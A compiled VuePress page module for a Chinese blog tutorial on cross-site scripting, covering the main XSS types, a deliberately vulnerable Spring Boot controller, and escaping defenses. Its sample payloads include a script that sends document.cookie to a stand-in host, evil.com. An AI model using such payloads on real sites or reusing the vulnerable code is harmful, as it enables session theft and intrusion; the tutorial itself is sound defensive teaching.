import{_ as s,o as n,c as a,f as t}from"./app-DkfD2H4x.js";const e={},p=t(`<h1 id="跨站脚本攻击-xss" tabindex="-1"><a class="header-anchor" href="#跨站脚本攻击-xss"><span>跨站脚本攻击（XSS）</span></a></h1><p>XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使脚本在用户浏览器中执行，从而窃取用户信息、冒充用户操作等。</p><h2 id="分类" tabindex="-1"><a class="header-anchor" href="#分类"><span>分类</span></a></h2><p>XSS 攻击主要分为三类：</p><h3 id="_1-反射型-xss" tabindex="-1"><a class="header-anchor" href="#_1-反射型-xss"><span>1. 反射型 XSS</span></a></h3><p>攻击代码作为请求参数提交，服务器端将其原样返回并在页面中立即执行。</p><p><strong>示例：</strong></p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>https://example.com/search?q=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果后端直接将 <code>q</code> 参数输出到页面，脚本会被执行。</p><h3 id="_2-存储型-xss" tabindex="-1"><a class="header-anchor" href="#_2-存储型-xss"><span>2. 存储型 XSS</span></a></h3><p>攻击代码被存储在服务器（如数据库、日志、评论等），其他用户访问时会被加载并执行。</p><p><strong>示例：</strong> 用户在评论区提交：</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;xss&#39;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>所有访问该评论的用户都会触发弹窗。</p><h3 id="_3-dom-型-xss" tabindex="-1"><a class="header-anchor" href="#_3-dom-型-xss"><span>3. DOM 型 XSS</span></a></h3><p>前端 JavaScript 动态拼接或插入未经过滤的用户输入，导致脚本执行。</p><p><strong>示例：</strong></p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token comment">&lt;!-- 前端代码 --&gt;</span>
document.getElementById(&#39;result&#39;).innerHTML = location.hash.substring(1);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>访问：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>https://example.com/#&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>会导致 XSS。</p><h2 id="原理" tabindex="-1"><a class="header-anchor" href="#原理"><span>原理</span></a></h2><p>攻击者将恶意 JavaScript 代码注入到网页中，当其他用户访问该页面时，恶意代码在其浏览器中执行，可能导致 Cookie 泄露、会话劫持、页面仿冒等安全问题。</p><h2 id="错误编码示例" tabindex="-1"><a class="header-anchor" href="#错误编码示例"><span>错误编码示例</span></a></h2><p>如下是易受 XSS 攻击的后端代码示例（以 Java Spring Boot 为例）：</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 未做任何输出转义的 Controller</span>
<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommentController</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">&quot;/comment&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">comment</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> content<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 直接输出用户输入内容，存在 XSS 风险</span>
        <span class="token keyword">return</span> <span class="token string">&quot;&lt;div&gt;&quot;</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">&quot;&lt;/div&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上述代码未对用户输入进行转义，攻击者可提交如下内容：</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;XSS&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>页面渲染后会弹窗，证明 XSS 攻击成功。</p><h2 id="安全编码方式" tabindex="-1"><a class="header-anchor" href="#安全编码方式"><span>安全编码方式</span></a></h2><ol><li>对所有输出到页面的内容进行 HTML 转义。</li><li>严格校验和过滤用户输入。</li><li>禁止在页面中使用 <code>innerHTML</code>、<code>eval</code> 等高危 API。</li><li>设置合适的 CSP（内容安全策略）。</li></ol><p><strong>Java Spring Boot 输出转义示例：</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 使用 Thymeleaf 等模板引擎自动转义</span>
<span class="token operator">&lt;</span>p th<span class="token operator">:</span>text<span class="token operator">=</span><span class="token string">&quot;\${content}&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>前端转义示例：</strong></p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&amp;&lt;&gt;&quot;&#39;]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string-property property">&#39;&amp;&#39;</span><span class="token operator">:</span><span class="token string">&#39;&amp;amp;&#39;</span><span class="token punctuation">,</span><span class="token string-property property">&#39;&lt;&#39;</span><span class="token operator">:</span><span class="token string">&#39;&amp;lt;&#39;</span><span class="token punctuation">,</span><span class="token string-property property">&#39;&gt;&#39;</span><span class="token operator">:</span><span class="token string">&#39;&amp;gt;&#39;</span><span class="token punctuation">,</span><span class="token string-property property">&#39;&quot;&#39;</span><span class="token operator">:</span><span class="token string">&#39;&amp;quot;&#39;</span><span class="token punctuation">,</span><span class="token string-property property">&#39;\\&#39;&#39;</span><span class="token operator">:</span><span class="token string">&#39;&amp;#39;&#39;</span><span class="token punctuation">}</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="攻击例子" tabindex="-1"><a class="header-anchor" href="#攻击例子"><span>攻击例子</span></a></h2><p>攻击者提交如下评论内容：</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&#39;https://evil.com/steal?cookie=&#39;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果未做防护，用户访问评论区时 Cookie 会被窃取。</p>`,39),l=[p];function o(c,i){return n(),a("div",null,l)}const u=s(e,[["render",o],["__file","xss.html.vue"]]),d=JSON.parse(`{"path":"/tech/%E5%AE%89%E5%85%A8/xss.html","title":"XSS（跨站脚本攻击）","lang":"zh-CN","frontmatter":{"title":"XSS（跨站脚本攻击）","date":"2025-06-26T00:00:00.000Z","category":["安全"],"description":"跨站脚本攻击（XSS） XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使脚本在用户浏览器中执行，从而窃取用户信息、冒充用户操作等。 分类 XSS 攻击主要分为三类： 1. 反射型 XSS 攻击代码作为请求参数提交，服务器端将其原样返回并在页面中立即执行。 示例： 如果后端...","gitInclude":[],"head":[["meta",{"property":"og:url","content":"https://github.com/King-sj/tech/%E5%AE%89%E5%85%A8/xss.html"}],["meta",{"property":"og:site_name","content":"blog"}],["meta",{"property":"og:title","content":"XSS（跨站脚本攻击）"}],["meta",{"property":"og:description","content":"跨站脚本攻击（XSS） XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使脚本在用户浏览器中执行，从而窃取用户信息、冒充用户操作等。 分类 XSS 攻击主要分为三类： 1. 反射型 XSS 攻击代码作为请求参数提交，服务器端将其原样返回并在页面中立即执行。 示例： 如果后端..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"KSJ"}],["meta",{"property":"article:published_time","content":"2025-06-26T00:00:00.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"XSS（跨站脚本攻击）\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2025-06-26T00:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"KSJ\\",\\"url\\":\\"https://github.com/King-sj\\"}]}"]]},"headers":[{"level":2,"title":"分类","slug":"分类","link":"#分类","children":[{"level":3,"title":"1. 反射型 XSS","slug":"_1-反射型-xss","link":"#_1-反射型-xss","children":[]},{"level":3,"title":"2. 存储型 XSS","slug":"_2-存储型-xss","link":"#_2-存储型-xss","children":[]},{"level":3,"title":"3. DOM 型 XSS","slug":"_3-dom-型-xss","link":"#_3-dom-型-xss","children":[]}]},{"level":2,"title":"原理","slug":"原理","link":"#原理","children":[]},{"level":2,"title":"错误编码示例","slug":"错误编码示例","link":"#错误编码示例","children":[]},{"level":2,"title":"安全编码方式","slug":"安全编码方式","link":"#安全编码方式","children":[]},{"level":2,"title":"攻击例子","slug":"攻击例子","link":"#攻击例子","children":[]}],"readingTime":{"minutes":2.06,"words":618},"filePathRelative":"tech/安全/xss.md","localizedDate":"2025年6月26日","excerpt":"\\n<p>XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使脚本在用户浏览器中执行，从而窃取用户信息、冒充用户操作等。</p>\\n<h2>分类</h2>\\n<p>XSS 攻击主要分为三类：</p>\\n<h3>1. 反射型 XSS</h3>\\n<p>攻击代码作为请求参数提交，服务器端将其原样返回并在页面中立即执行。</p>\\n<p><strong>示例：</strong></p>\\n<div class=\\"language-text\\" data-ext=\\"text\\" data-title=\\"text\\"><pre class=\\"language-text\\"><code>https://example.com/search?q=&lt;script&gt;alert('xss')&lt;/script&gt;\\n</code></pre></div>","autoDesc":true}`);export{u as comp,d as data};
